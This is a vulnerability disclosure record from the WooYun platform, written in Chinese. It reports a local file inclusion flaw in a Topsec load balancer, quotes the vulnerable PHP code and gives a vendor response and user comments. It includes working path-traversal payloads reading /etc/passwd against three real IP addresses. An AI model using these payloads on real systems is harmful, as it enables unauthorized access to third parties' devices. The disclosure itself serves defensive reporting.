{"id": 45549, "wybug_id": "wooyun-2015-0118464", "wybug_title": "天融信负载均衡本地文件包含漏洞", "wybug_corp": "天融信", "wybug_author": "路人甲", "wybug_date": "2015-06-05 17:30", "wybug_open_date": "2015-09-08 14:22", "wybug_type": "文件包含", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-08：\t细节向公众公开  简要描述： 天融信负载均衡本地文件包含漏洞 详细说明：  本地文件包含：漏洞说明：出入的地方：在change_lan.php传入会话变量。\n<?phperror_reporting(E_ALL ^ E_WARNING ^ E_NOTICE);include_once dirname(__FILE__).\"/acc/common/config/item/configItem.inc\";require_once dirname(__FILE__).\"/acc/common/constant.inc\";include_once dirname(__FILE__).\"/acc/common/config/uci/dao/appexSystemDao.inc\";$configItem = new ConfigItem();/** * * * @version $Id: change_lan.php,v 1.8.2.4 2011/10/11 04:20:42 jzhang Exp $ * @copyright 2008 */    $lanID = 'En';\t    $refLink = $_SERVER['HTTP_REFERER'];    if(empty($refLink)){        $refLink = \"/index.php\";    }    $refLink = str_replace(\"?error=1\", \"\", $refLink);    if(array_key_exists('LanID',$_REQUEST))    {        $lanID = $_REQUEST[\"LanID\"];\t\t$appexSystemDao = new AppexSystemDao();\t\t$appexSystemDao->setAppexSystemConfigItemValue(LANGUAGE_ID_FIELD,$lanID);          $appexSystemDao->commit();        session_start();        $_SESSION['lanID'] = $lanID;        header('Location: ' . $refLink);    }else{    \theader('Location: ' . $refLink . '?LanID=' . $lanID);    }    ?>\n执行的地方在，uiResources.inc，包含语言包\n<?php/** * * * @version $Id: uiResources.inc,v 1.4 2009/05/25 08:42:57 jzhang Exp $ * @copyright 2008 */include_once dirname(__FILE__).\"/../config/item/configItem.inc\";require_once dirname(__FILE__).\"/../constant.inc\";include_once dirname(__FILE__).\"/../config/uci/dao/appexSystemDao.inc\";$appexSystemDao = new AppexSystemDao();$lanID = $appexSystemDao->getAppexSystemConfigItemValue(LANGUAGE_ID_FIELD);if(empty($lanID)){    $lanID = \"En\";}$uiResBasic = dirname(__FILE__) . \"/../../common/uiResources_\".$lanID.\".inc\";$uiRes = dirname(__FILE__) . \"/../../common/clsf/uiResources_clsf_\".$lanID.\".inc\";include_once $uiResBasic;include_once $uiRes;?>\n网络案例：http://61.148.24.182:8080/change_lan.php?LanID=../../../../../../../../../etc/passwd%00http://61.54.222.43:8080/change_lan.php?LanID=../../../../../../../../../etc/passwd%00http://222.143.9.1/change_lan.php?LanID=../../../../../../../../../etc/passwd%00截图证明：\n\n   漏洞证明：  见详细   修复方案：  传入的LanID过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-06-10 14:21 厂商回复： 此漏洞，已经收到其它提交，感谢您的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-05 18:10 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  漏洞后遗症    \n     2015-06-10 14:27 |    \t\tkk_skipper \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:8        | 123)\t\t \n  其他提交？补天？应该没有。    \n     2015-09-08 15:45 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  明显的漏洞哦，略屌    \n     2015-09-08 16:06 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:2        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  长见识了    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}